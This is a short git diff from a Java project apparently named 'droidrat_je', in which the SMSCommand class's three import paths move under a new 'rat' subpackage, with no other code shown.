@@ -1,9 +1,9 @@
 package com.je_chen.droidrat_je.command;
 
 
-import com.je_chen.droidrat_je.command.process_super.CommandFather;
-import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;
-import com.je_chen.droidrat_je.modules.appintent.sms.SMS;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;
+import com.je_chen.droidrat_je.rat.modules.appintent.sms.SMS;
 
 public class SMSCommand extends CommandFather implements CommandProcessInterface {
 
